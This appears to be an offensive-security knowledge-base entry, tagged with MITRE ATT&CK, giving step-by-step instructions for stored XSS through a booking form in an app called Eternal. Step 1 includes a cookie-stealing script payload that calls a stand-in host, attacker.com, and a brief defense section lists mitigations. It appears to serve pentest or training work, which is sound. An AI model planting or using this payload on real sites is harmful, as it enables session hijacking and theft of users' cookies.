---
id: c3d4e5f6-g7h8-9012-cdef-345678901234
tags:
  - xss
  - persistent-xss
  - javascript
  - payload-injection
type: procedure
tools: []
tactics:
  - '[[Execution]]'
  - '[[Collection]]'
commands: []
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[JavaScript]]'
updated_at: '2025-12-14T03:15:26.758Z'
skill_level: intermediate
impact_level: high
detection_risk: medium
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Execution]]'
  - '[[Collection]]'
mitre_techniques:
  - '[[JavaScript]]'
---
# Inject-Malicious-Payload-for-Persistent-XSS

## Summary

This procedure demonstrates injecting a malicious JavaScript payload into a vulnerable booking form field of the Eternal application, resulting in persistent storage and execution for any user viewing the affected reservation, potentially leading to session hijacking or data theft.

## Description

Building on identified vulnerable inputs, this targets the lack of output escaping in stored data. The attacker submits JavaScript via the form, which persists in the database and runs client-side on page load. In the Eternal app scenario, this affects all viewers of the booking details. Outcomes include script execution for unauthorized actions. Requires prior vulnerability confirmation.

## Requirements

1. Confirmed vulnerable input field from reconnaissance.
2. Video recording capability to capture injection and execution.
3. Attacker-controlled server for payload callbacks (e.g., to exfiltrate data).

## Defense

Defensive measures and detection strategies:

- Sanitize all stored inputs with libraries like DOMPurify.
- Implement Web Application Firewall (WAF) rules to block script tags.
- Audit database queries for unescaped user data in outputs.

## Objectives

1. Store malicious script persistently in the application database.
2. Achieve execution on client-side for unauthorized users.
3. Demonstrate impact through data exfiltration or session manipulation.

## Instructions

### Step 1: Craft Payload

**Context**: Develop a JavaScript payload tailored to the vulnerability for persistence and impact.

Create a payload like `<script>fetch('http://attacker.com/log?data='+encodeURIComponent(document.cookie))</script>` to exfiltrate cookies. Ensure it's concise to evade basic filters.

### Step 2: Submit Payload

**Context**: Inject the payload into the vulnerable form field and submit to store it.

On the Eternal booking page, enter the payload in the identified field (e.g., notes). Complete and submit the form. Immediately record the process using screen capture software to document the injection.

> Submission stores the unescaped script in the database without execution at this stage.

### Step 3: Verify Execution and Persistence

**Context**: Test the payload's execution by viewing the booking details as another user.

Navigate to the reservation details page (e.g., via a shared link or search). Observe if the script executes (e.g., network request to attacker server). Use a different browser session to simulate another user. Record video evidence of the alert or data theft.

## MITRE ATT&CK Mapping

### Tactics

- [[Execution]]
- [[Collection]]

### Techniques

- [[JavaScript]]

### Sub-Techniques


## Commands Used


## Tools Used


## Tags

- [[xss]]
- [[persistent-xss]]
- [[JavaScript]]
- [[payload-injection]]
